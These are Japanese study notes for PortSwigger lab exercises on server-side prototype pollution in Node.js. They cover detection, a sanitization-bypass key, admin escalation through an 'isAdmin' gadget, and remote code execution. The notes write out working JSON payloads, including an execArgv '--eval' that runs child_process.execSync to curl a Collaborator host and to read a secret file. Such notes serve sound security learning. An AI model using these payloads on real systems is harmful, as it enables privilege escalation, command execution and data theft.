## SSPPのメソドロジー

#### Detect: SSPP脆弱性

- [4. Server-side prototype pollution(SSPP)](4.%20Server-side%20prototype%20pollution(SSPP).md#BAPP%20Server-side%20Prototype%20Pollution%20Scannerによる脆弱性の検出)でSSPPの脆弱性を検出する

###### 検出できない場合

1. `POST`もしくは`PUT`でJSONデータをアプリ/APIに送信しているリクエストを見つけてRepeaterへ送る
2.  サニタイジングをバイパスして検出する
- Constructorを使用
```json
"constructor":{"prototype":{
"code":499,"status":499,"statusCode":499,
"content-type": "application/json; charset=utf-7",
"json spaces":10
}}
```
	or
```json
"__pro__proto__to__": {
"code":499,"status":499,"statusCode":499,
"content-type": "application/json; charset=utf-7",
"json spaces":10
}
```
- 検出時の兆候は[4. Server-side prototype pollution(SSPP)](4.%20Server-side%20prototype%20pollution(SSPP).md#パラメタ汚染無しでのSSPP検出テクニック)を参考
- その他のテクニックは[3. Client-side prototype pollution(CSPP)](3.%20Client-side%20prototype%20pollution(CSPP).md#keyサニタイズ欠陥の悪用ステップ(Client-side%20prototype%20pollution%20via%20flawed%20sanitization))

#### Stage2: PrivEscの場合：Gadgetを使用して権限昇格

1. レスポンスに`"isAdmin": false`などのGadgetがないか
2. パラメタを書き換えてsend。200が返るか
```json
{ ...,
	"__proto__": {
	    "isAdmin":true
	}
}
```
	or
```json
"constructor":{"prototype":{
 "isAdmin":true
}}
```
	or
```json
"__pro__proto__to__": {
	"isAdmin":true
}
```

#### Stage3: RCEの場合

- Issue: SSPP Collaborator pingback(DNS)と表示されたリクエスト
```http
{ ...,

	"__proto__":{
		"argv0":"node",
		"shell":"node",
		"NODE_OPTIONS":"--inspect=mzp8h2dx9m0dk57r7vdnu7i7dyjw7l\"\".oastify\"\".com"}
	    }
}
```
1. 以下を`__proto__`内につけ加える
```http
"execArgv":[
        "--eval=require('child_process').execSync('curl https://COLLABORATOR_DOMAIN')"
    ]
```

2. オブジェクトを生成する機能(Run maintainance job等)を==実行したあと==、Collaboratorへlookupされているか確認する
3. 目的のシェルコマンドに書き換えリクエスト。その後、オブジェクトを生成する機能を再度実行し目的達成
```http
"execArgv":[
        "--eval=require('child_process').execSync('head -n1 /home/carlos/secret')"
    ]
```

## 汚染されたプロパティ反映によるSSPPの検出

###### 基本概念

- JavaScriptの`for...in`ループなどのバックエンドのコードは、Prototype chain上のすべてのプロパティに影響があることを開発者が知らないケースがある
- [詳細](https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-via-polluted-property-reflection)

### Server-side Prototype汚染によるPrivEscステップ

1. `POST`もしくは`PUT`でJSONデータをアプリケーション/APIに送信しているリクエストを見つけてRepeaterへ送る
```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener"
}
```
2. Sourceを確認するため、適当なプロパティをJSONに追加してsend
```js
	"lastName":"Wiener",
	"__proto__": {
	    "foo":"bar"
	}
}
```
- `"foo":"bar"`がレスポンスに反映されていて、かつ、`__proto__`が無いことを確認する
	- これはPrototype chainを通じて注入したプロパティが現在のオブジェクトに反映されたということを表す

3. Gadgetを探す。レスポンスに興味深い内容があることがある
```json
	"isAdmin":"false"
```
4. 権限昇格のためGadgetを悪用してsend
```js
"__proto__": {
    "isAdmin":true
}
```
- レスポンスに反映されていることを確認する

## プロパティを汚染することなくSSPPを検出

- 詳細: [Detecting server-side prototype pollution without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection)

1.  `POST`もしくは`PUT`でJSONデータをアプリケーション/APIに送信しているリクエストを見つけてRepeaterへ送る
2. 以下を注入する
```json
"__proto__":{
"code":499,"status":499,"statusCode":499,
"content-type": "application/json; charset=utf-7",
"json spaces":10
}
```

#### パラメタ汚染無しでのSSPP検出テクニック
###### status code override

- `"code":499,"status":499,"statusCode":499,`
- 検出時の兆候：　エラー・レスポンスを再度トリガーし、ステータス・コードが指定値に上書きされている
###### Charset override

- `"content-type": "application/json; charset=utf-7",`:
- 検出時の兆候：レスポンスに元来の`charset=utf-8`ではなく`charset=utf-8`が反映されている
###### JSON spaces override

- `"json spaces":10`
- 検出時の兆候： データをインデントするための空白数が指定した値になって数になっている
- ⚠️: レスポンスは"Raw"で表示する。Prettyだと空白数が統一されて違いがわからない
- ↓json spaceでインデントの空白数が増えている様子

## BAPP: Server-side Prototype Pollution Scannerによる脆弱性の検出

- [詳細](https://portswigger.net/blog/server-side-prototype-pollution-scanner)
- 脆弱性の種類を自動で検知する。(HTTP Request Smugglerのsmuggle probeのようなもの)

1. ターゲットサイトをTarget scopeに加える
2. なるべく多くのエンドポイントへの異なるリクエストメソッドのリクエストをHTTP Historyに記録するために、Webサイトを探検する
3. HTTP Historyタブで、HTTPでターゲットに対して==インタラクションがあるリクエスト==すべてを選択する
	- ==⚠️==LABでsolved表示用のjsやacademylabheaderなどは選択しない。フィルタが掛かりうまく検証できないので

4. 右クリック-> Extensions -> Server-Side Prototype Pollution Scanner -> Server-Side Prototype Pollution -> Full Scanでフルスキャンを実施する
5. Proの場合はDashboardのissuesタブから、Communityの場合はExtensionsのOutputから結果を確認する
	- HRSと同じように、"Found isssude: ~", "Evidence: "という形式で表示される
	- Issueには[4. Server-side prototype pollution(SSPP)](4.%20Server-side%20prototype%20pollution(SSPP).md#パラメタ汚染無しでのSSPP検出テクニック)が記載される(`JSON spacing`)
